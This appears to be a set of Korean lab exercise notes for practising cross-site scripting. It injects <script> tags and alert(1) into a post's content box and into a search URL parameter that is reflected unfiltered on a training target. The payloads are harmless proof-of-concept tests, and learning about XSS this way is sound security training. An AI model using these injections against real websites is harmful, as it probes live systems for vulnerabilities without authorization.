# 실습1. Content에 <script>사용하기
- title에 아무거나 넣어본다.
> 예를 들어 [XSS실습]

- Content에 <script> 삽입하기.
> 예를 들어 Content 박스 안에
```html
<script>
</script>
``` 

# 실습2. alert(1) 넣어보기
- Content 박스안에 alert(1)만 넣어보자!
```javascript
<script>
alert(1);
</script>
```

# 실습3. URL주소로 장난쳐보기
- 실습 설명을 읽어보고 정리하면 다음과 같다
> search 매개변수에 주어진 값을 h3태그에 필터없이 '그대로' 띄워준다.
일단 URL에 <script> 태그만 넣어보자.
```http://{target-url}/?search=<script></script>```

# 실습4. URL로 장난쳐서 alert 띄워보기
> script태그 사이에 alert만 쳐주면 된다.
```http://{target-url}/?search=<script>alert(1)</script>```